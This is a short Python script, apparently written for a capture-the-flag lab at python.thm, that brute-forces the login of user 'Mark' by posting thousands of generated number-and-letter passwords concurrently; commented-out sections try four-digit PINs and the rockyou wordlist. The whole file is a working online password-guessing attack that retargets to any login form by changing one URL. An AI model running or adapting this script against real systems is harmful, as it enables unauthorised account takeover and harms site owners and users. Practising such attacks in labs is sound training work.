import requests
from concurrent.futures import ThreadPoolExecutor

username = 'Mark'

url = "http://python.thm/labs/lab1/"

wordlist = "/usr/share/wordlists/rockyou.txt"

found = False

passwords = []
alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"


for password in range(0,10000):
    pass_str = str(password)
    filled_password = pass_str.zfill(3) # Дополняем до 4 символов.
    for symb in (alphabet):
        passwords.append(filled_password + symb) # Добавляем в конец символ

print('start bruteforce:')

def brute_force(password):
    global found
    if found:  # Если уже нашли - ничего не делаем
        return None

    data = {"username":username,"password":password}
    try:
        response = requests.post(url,data=data)
        if "Invalid" in response.text:
            print('password invalid:',password)
        else:
            print('PASSWORD FOUND:',password)
            print('response:',response.text)
            found = True
            return password
    except:
        pass
    return None
    

with ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(brute_force,passwords)


# for password in range(0,10000):
#     password_str = str(password).zfill(4)
#     brute_force(password_str)


# with open(wordlist, 'r', encoding='utf-8', errors='ignore') as file:
#     for line in file:
#         password = line.strip()  
#         brute_force(password)
